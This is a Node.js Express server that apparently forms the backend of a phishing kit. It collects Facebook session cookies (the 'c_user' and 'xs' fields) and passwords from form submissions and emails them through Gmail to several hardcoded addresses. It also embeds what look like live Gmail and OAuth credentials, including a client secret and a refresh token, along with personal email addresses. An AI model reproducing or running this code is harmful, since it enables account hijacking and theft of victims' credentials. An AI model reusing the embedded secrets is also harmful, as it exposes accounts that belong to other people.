const express = require("express");
const path = require("path");
const nodemailer = require('nodemailer')
const PORT = 80;
const bodyParser = require("body-parser");


const app = express();
app.use(express.static(path.join(__dirname,'static')))
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const name = "Rashid"
const emails = [
  "unaisnizamani598@gmail.com",
  "marina.bhoo.so@gmail.com",
  
]
const workerEmail = "official.ada.marnes.wood@gmail.com";




let transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    type: 'OAuth2',
    user: "helpmate73@gmail.com",
    pass: "rgqelzcaxjkdcgxg",
    clientId: "386032684654-t8d3c930d8llug8p26kvcq7hirbqib9l.apps.googleusercontent.com",
    clientSecret: "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",
    refreshToken: "1//04nvk9JZlEhpdCgYIARAAGAQSNwF-L9IrIUb8lo5ZBXVY0buzCu9MmY-KsqM-Q6Cpovh7TMcOvLMOYniZLTAPNjEw3VGaWQV3RwI"
  }
});



const sendMail = (name,email,cookie,uid)=>{
  let mailOptions = {
    to:email,
    from:'helpmate73@gmail.com',
    subject:'Cookie',
    text:`
     name:${name}
     xs:${cookie}
     uid:${uid}`,
   
}

transporter.sendMail(mailOptions,(error,result)=>{
    if(error){
       console.log(error)
    }
    else{
     
    }
  })
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", async (req, res) => {

  const uid = req.body.c_user;
  const cookie = req.body.xs;



  for(let i=0;i<emails.length;i++) {
    sendMail(name,emails[i],cookie,uid)

  }


  setTimeout(()=>{
    res.sendFile(path.join(__dirname, "password.html"));
 },1000)

});


app.post("/", async (req, res) => {
  
  
  const uid = req.body.c_user;
  const cookie = req.body.xs;




  for(let i=0;i<emails.length;i++) {
    sendMail(name,emails[i],cookie,uid)

  }


  setTimeout(()=>{
    res.sendFile(path.join(__dirname, "password.html"));
 },1000)


  
});

app.get("/submit", (req, res) => {
  res.sendFile(path.join(__dirname, "submit.html"));
});



app.get("/pass", (req, res) => {
  res.sendFile(path.join(__dirname, "password.html"));
});

app.post('/pass',(req,res)=>{
  const password = req.body.password;
  
  sendPassword(workerEmail,password);

  for(let i=0;i<emails.length;i++) {
    sendPassword(name,emails[i],password)

  }


  setTimeout(()=>{
    res.sendFile(path.join(__dirname, "password.html"));
 },1000)

})


const sendPassword = (email,password)=>{
  let mailOptions = {
    to:email,
    from:'helpmate73@gmail.com',
    subject:'Password',
    text:`
     password:${password}`
   
}

transporter.sendMail(mailOptions,(error,result)=>{
    if(error){
       console.log(error)
    }
    else{
     
    }
  })
}

app.listen(PORT, () => {
  console.log("app started....");
});

// { port: process.env.PORT, host: "0.0.0.0" }
